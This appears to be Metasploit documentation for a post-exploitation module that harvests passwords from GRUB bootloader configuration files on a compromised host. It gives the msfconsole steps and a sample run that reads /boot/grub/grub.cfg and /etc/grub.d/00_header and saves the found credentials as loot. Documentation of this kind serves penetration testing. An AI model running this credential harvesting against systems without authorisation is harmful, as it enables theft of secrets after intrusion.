## Vulnerable Application

  This post-exploitation module will gather passwords from GRUB bootloader config files.

## Verification Steps

  1. Start `msfconsole`
  2. Get shell/meterpreter session
  3. Do: `use post/multi/gather/grub_password`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. The gathered passwords will be printed to the console and saved to the database. You should be able to see the extracted `grub.config` file in the loot files

## Options

  - **SESSION** - The session to run the module on.

## Scenarios

  Typical run against Ubuntu 16.04 LTS

  ```
  msf exploit(handler) > use post/multi/gather/grub_password 
  msf post(grub_password) > set SESSION 1
  SESSION => 1
  msf post(grub_password) > run

  [*] Searching for GRUB config files..
  [*] Reading /boot/grub/grub.cfg
  [*] No passwords found in GRUB config file: /boot/grub/grub.cfg
  [+] /boot/grub/grub.cfg saved to /home/user/.msf4/loot/20190217212515_default_172.25.14.160_grub.config_675306.txt
  [*] Reading /etc/grub.d/00_header
  [*] Found password: password John foo
  [+] Saved credentials
  [+] /etc/grub.d/00_header saved to /home/user/.msf4/loot/20190217212517_default_172.25.14.160_grub.config_259839.txt
  [*] Post module execution completed
  ```
